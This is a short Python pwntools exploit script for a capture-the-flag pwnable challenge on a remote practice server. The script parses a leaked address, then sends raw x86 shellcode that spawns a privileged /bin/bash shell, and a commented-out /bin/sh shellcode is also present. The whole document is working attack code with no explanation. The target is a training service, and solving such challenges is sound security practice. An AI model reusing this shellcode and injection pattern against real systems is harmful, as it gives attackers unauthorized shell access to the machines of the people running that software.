from pwn import *

#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30025)
elf = ELF("./challenge")                                                               

p.recvuntil("POW: x + y == ")
buf = int(p.recvline(), 16)
log.info("buf : "+hex(buf))
p.sendlineafter("> ", str(buf) + " 0")

#shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

#shellcode = asm(shellcraft.amd64.sh())
#p.sendafter("Input: ", p32(0) + shellcode)
pay = "\x00"*4  + shellcode
p.sendafter("Input: ", pay)

p.interactive()
